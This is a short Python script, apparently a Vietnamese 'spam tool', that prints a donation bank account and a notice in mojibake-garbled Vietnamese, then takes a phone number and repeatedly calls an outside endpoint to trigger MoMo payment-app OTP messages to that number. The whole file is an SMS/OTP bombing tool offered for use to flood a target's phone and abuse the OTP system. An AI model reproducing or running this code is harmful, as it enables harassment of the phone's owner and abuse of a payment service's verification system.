import requests, time
from time import sleep
print ("------Information Donate------")
print ("MBBANK: 126102003")
print ("------------------------------")
print ("")
print ("â€¢ThĂ´ng bĂ¡o: Tool VTPay Ä‘ang lá»—i admin sáº½ fix vĂ  tĂ¬m thĂªm nhiá»u tool spam")
print ("Theo dĂµi táº¡i: @codengonbyduy")
print ("")
phone = input("Input phone: ")
while True:
   main = requests.get("https://danganhduy.io/login-momo.php?phone="+str(phone)).json()
   if main == 0:
       print ("Spam so nay an lon a?")
       sleep(5)
       break
   else:
       print ("SEND OTP MOMO SUCCESS: "+phone)
       sleep(1)
